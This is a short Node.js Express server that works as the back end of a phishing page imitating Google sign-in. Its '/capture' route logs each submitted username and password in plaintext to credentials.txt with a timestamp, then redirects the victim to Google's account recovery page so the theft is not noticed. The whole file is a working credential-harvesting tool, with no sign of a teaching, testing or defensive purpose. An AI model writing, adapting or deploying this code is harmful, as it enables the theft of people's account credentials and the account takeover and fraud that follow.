const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/capture', (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] Username: ${username} | Password: ${password}\n`;
  
  fs.appendFileSync('credentials.txt', logEntry);
  console.log('Credentials saved!');
  
  res.redirect('https://accounts.google.com/signin/v2/recovery');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
